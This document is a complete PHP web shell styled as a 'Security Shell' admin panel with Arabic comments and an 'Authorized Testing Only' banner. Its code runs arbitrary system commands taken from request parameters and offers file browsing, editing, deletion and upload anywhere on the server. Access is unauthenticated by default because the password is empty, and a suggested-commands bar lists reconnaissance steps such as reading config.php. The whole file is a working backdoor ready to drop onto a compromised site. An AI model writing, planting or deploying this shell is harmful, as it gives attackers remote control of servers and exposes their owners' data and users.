<?php
// ======================================================
// Advanced Web Shell - Security Testing Tool
// Authorized Use Only - Delete after testing
// ======================================================

// حماية بسيطة (اختيارية) - غير كلمة المرور
$password = "";
if(!empty($password) && (!isset($_POST['auth']) || $_POST['auth'] !== $password)) {
    if(!isset($_GET['p']) || $_GET['p'] !== md5($password)) {
        echo '<form method="POST"><input type="password" name="auth" placeholder="Password"><button>Login</button></form>';
        die();
    }
}

// تحديد المجلد الحالي
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if(!is_dir($current_dir)) {
    $current_dir = dirname($current_dir);
}
chdir($current_dir);

// تنفيذ الأوامر
$output = '';
$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : (isset($_GET['cmd']) ? $_GET['cmd'] : '');
if($cmd) {
    ob_start();
    system($cmd . " 2>&1");
    $output = ob_get_clean();
}

// معالجة الملفات (حذف، تحرير، رفع)
$message = '';
if(isset($_GET['delete'])) {
    if(unlink($_GET['delete'])) $message = "Deleted: " . htmlspecialchars($_GET['delete']);
    else $message = "Delete failed: " . htmlspecialchars($_GET['delete']);
}
if(isset($_POST['edit_file']) && isset($_POST['content'])) {
    if(file_put_contents($_POST['edit_file'], $_POST['content'])) $message = "Saved: " . htmlspecialchars($_POST['edit_file']);
}
if(isset($_FILES['upload_file'])) {
    $target = $current_dir . '/' . basename($_FILES['upload_file']['name']);
    if(move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) $message = "Uploaded: " . htmlspecialchars(basename($_FILES['upload_file']['name']));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Shell | Admin Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0d1525 100%);
            font-family: 'Segoe UI', 'Courier New', monospace;
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        
        /* Header */
        .header {
            background: rgba(15, 25, 45, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 20px 30px;
            margin-bottom: 25px;
            border: 1px solid rgba(0, 255, 255, 0.2);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .header h1 {
            font-size: 28px;
            background: linear-gradient(90deg, #00ffcc, #0066ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            display: inline-block;
        }
        .header .badge {
            background: #00cc8844;
            border: 1px solid #00ffaa;
            border-radius: 20px;
            padding: 5px 15px;
            font-size: 12px;
            margin-left: 15px;
        }
        
        /* Grid Layout */
        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
            margin-bottom: 25px;
        }
        .card {
            background: rgba(10, 18, 28, 0.9);
            backdrop-filter: blur(5px);
            border-radius: 16px;
            border: 1px solid #2a3a5a;
            overflow: hidden;
        }
        .card-header {
            background: linear-gradient(135deg, #1a2a3a, #0f1a2a);
            padding: 12px 20px;
            font-weight: bold;
            border-bottom: 1px solid #2a4a6a;
            font-size: 14px;
            letter-spacing: 1px;
        }
        .card-header i { color: #00ffcc; margin-right: 8px; }
        .card-body { padding: 20px; }
        
        /* Terminal */
        .terminal {
            background: #050a12;
            border-radius: 12px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            border: 1px solid #2a4a6a;
            max-height: 400px;
            overflow: auto;
            white-space: pre-wrap;
            color: #00ffaa;
        }
        
        /* File Table */
        .file-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }
        .file-table th {
            text-align: left;
            padding: 10px 8px;
            background: #0f1a2a;
            border-bottom: 1px solid #2a4a6a;
            color: #00ffcc;
        }
        .file-table td {
            padding: 8px;
            border-bottom: 1px solid #1a2a3a;
        }
        .file-table tr:hover { background: #0f1a2a; }
        .file-link { color: #ffaa66; text-decoration: none; }
        .file-link:hover { color: #ffcc88; text-decoration: underline; }
        .dir-link { color: #66ffcc; text-decoration: none; font-weight: bold; }
        .delete-link { color: #ff6666; margin-left: 10px; font-size: 11px; }
        
        /* Form Elements */
        input, select, textarea {
            background: #0a1220;
            border: 1px solid #2a4a6a;
            color: #e0e0e0;
            padding: 10px 12px;
            border-radius: 8px;
            font-family: monospace;
        }
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #00ffcc;
            box-shadow: 0 0 8px rgba(0,255,204,0.3);
        }
        button, .btn {
            background: linear-gradient(90deg, #0066ff, #00ccaa);
            border: none;
            color: white;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
        }
        button:hover {
            transform: scale(1.02);
            box-shadow: 0 4px 15px rgba(0,102,255,0.4);
        }
        
        /* Info Bars */
        .info-bar {
            background: #0a1220;
            border-radius: 10px;
            padding: 12px 20px;
            margin-bottom: 20px;
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            font-size: 12px;
            border: 1px solid #2a3a5a;
        }
        .info-item {
            background: #0f1a2a;
            padding: 5px 12px;
            border-radius: 20px;
        }
        
        /* Upload Area */
        .upload-area {
            border: 2px dashed #2a4a6a;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
        }
        
        /* Responsive */
        @media (max-width: 800px) {
            .grid-2 { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
<div class="container">
    
    <!-- Header -->
    <div class="header">
        <h1>⚡ SECURITY SHELL</h1>
        <span class="badge">Authorized Testing Only</span>
        <div style="float: right; font-size: 12px;"><?= date('Y-m-d H:i:s') ?></div>
    </div>
    
    <!-- Info Bar -->
    <div class="info-bar">
        <span class="info-item">📁 Current: <?= htmlspecialchars($current_dir) ?></span>
        <span class="info-item">👤 User: <?= function_exists('exec') ? exec('whoami') : get_current_user() ?></span>
        <span class="info-item">💻 OS: <?= php_uname('s') ?></span>
        <span class="info-item">🐘 PHP: <?= phpversion() ?></span>
        <span class="info-item">🔓 Safe Mode: <?= ini_get('safe_mode') ? 'ON' : 'OFF' ?></span>
    </div>
    
    <?php if($message): ?>
        <div style="background: #00aa6644; border: 1px solid #00ffaa; border-radius: 10px; padding: 10px 15px; margin-bottom: 20px;">
            ✅ <?= $message ?>
        </div>
    <?php endif; ?>
    
    <div class="grid-2">
        <!-- Terminal Section -->
        <div class="card">
            <div class="card-header">
                <i>🖥️</i> COMMAND EXECUTION
            </div>
            <div class="card-body">
                <form method="POST" style="margin-bottom: 15px;">
                    <div style="display: flex; gap: 10px;">
                        <input type="text" name="cmd" placeholder="Enter command (whoami, ls -la, id...)" style="flex:1;" value="<?= htmlspecialchars($cmd) ?>">
                        <button type="submit">▶ EXECUTE</button>
                    </div>
                </form>
                <div class="terminal">
                    <?= $output ? htmlspecialchars($output) : '> Ready. Type a command and press Execute.' ?>
                </div>
            </div>
        </div>
        
        <!-- File Upload Section -->
        <div class="card">
            <div class="card-header">
                <i>📤</i> FILE UPLOAD
            </div>
            <div class="card-body">
                <form method="POST" enctype="multipart/form-data" class="upload-area">
                    <input type="file" name="upload_file" style="margin-bottom: 10px;">
                    <button type="submit">⬆ UPLOAD</button>
                </form>
                <div style="margin-top: 15px; font-size: 12px; color: #aaa;">
                    Uploaded files go to: <?= htmlspecialchars($current_dir) ?>
                </div>
            </div>
        </div>
    </div>
    
    <!-- File Manager Section -->
    <div class="card">
        <div class="card-header">
            <i>📂</i> FILE MANAGER
        </div>
        <div class="card-body">
            <div style="margin-bottom: 15px;">
                <a href="?dir=<?= urlencode($current_dir . '/..') ?>" class="btn" style="text-decoration:none; padding:5px 12px;">⬆ Parent Directory</a>
                <span style="margin-left: 15px;">Current: <strong><?= htmlspecialchars($current_dir) ?></strong></span>
            </div>
            
            <table class="file-table">
                <thead>
                    <tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>
                </thead>
                <tbody>
                    <?php
                    $files = scandir($current_dir);
                    foreach($files as $file):
                        if($file == '.' || $file == '..') continue;
                        $full_path = $current_dir . '/' . $file;
                        $is_dir = is_dir($full_path);
                        $size = $is_dir ? '-' : filesize($full_path) . ' B';
                        $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                    ?>
                    <tr>
                        <td>
                            <?php if($is_dir): ?>
                                📁 <a href="?dir=<?= urlencode($full_path) ?>" class="dir-link"><?= htmlspecialchars($file) ?></a>
                            <?php else: ?>
                                📄 <a href="?edit=<?= urlencode($full_path) ?>" class="file-link"><?= htmlspecialchars($file) ?></a>
                            <?php endif; ?>
                        </td>
                        <td><?= $size ?></td>
                        <td><?= $perms ?></td>
                        <td>
                            <a href="?delete=<?= urlencode($full_path) ?>&dir=<?= urlencode($current_dir) ?>" class="delete-link" onclick="return confirm('Delete?')">🗑 Delete</a>
                            <?php if(!$is_dir): ?>
                                <a href="?edit=<?= urlencode($full_path) ?>" class="delete-link" style="color:#66ffcc;">✏ Edit</a>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>
    
    <!-- File Editor Section (if editing) -->
    <?php if(isset($_GET['edit']) && file_exists($_GET['edit'])): 
        $edit_file = $_GET['edit'];
        $file_content = file_get_contents($edit_file);
    ?>
    <div class="card" style="margin-top: 25px;">
        <div class="card-header">
            <i>✏️</i> EDITING: <?= htmlspecialchars(basename($edit_file)) ?>
        </div>
        <div class="card-body">
            <form method="POST">
                <input type="hidden" name="edit_file" value="<?= htmlspecialchars($edit_file) ?>">
                <textarea name="content" style="width:100%; height:400px; font-family:monospace; background:#0a0f1a; color:#00ffaa; border:1px solid #2a4a6a;"><?= htmlspecialchars($file_content) ?></textarea>
                <div style="margin-top: 15px;">
                    <button type="submit">💾 SAVE CHANGES</button>
                    <a href="?dir=<?= urlencode($current_dir) ?>" class="btn" style="background:#333; text-decoration:none;">⬅ Cancel</a>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Quick Commands -->
    <div style="margin-top: 20px; text-align: center; font-size: 12px; color: #6688aa;">
        <span style="margin:0 10px;">🔹 whoami</span>
        <span style="margin:0 10px;">🔹 ls -la</span>
        <span style="margin:0 10px;">🔹 pwd</span>
        <span style="margin:0 10px;">🔹 id</span>
        <span style="margin:0 10px;">🔹 cat config.php</span>
        <span style="margin:0 10px;">🔹 php -v</span>
    </div>
</div>
</body>
</html>
